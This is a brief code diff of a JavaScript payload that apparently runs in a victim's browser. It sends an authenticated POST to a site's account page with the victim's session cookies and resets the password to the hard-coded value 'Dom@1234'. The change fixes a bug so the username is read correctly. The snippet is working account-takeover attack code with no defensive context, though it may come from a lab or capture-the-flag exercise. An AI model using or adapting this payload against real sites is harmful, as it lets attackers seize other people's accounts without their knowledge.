@@ -4,7 +4,7 @@ xhr.open('POST', `${origin}/index.php?page=account.php`);
 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 xhr.withCredentials = true;
 
-let username = document.querySelector('input[name="username"]')
+let username = document.querySelector('input[name="username"]').value
 let password = 'Dom@1234'
 let data = `username=${username}&password=${password}`
 
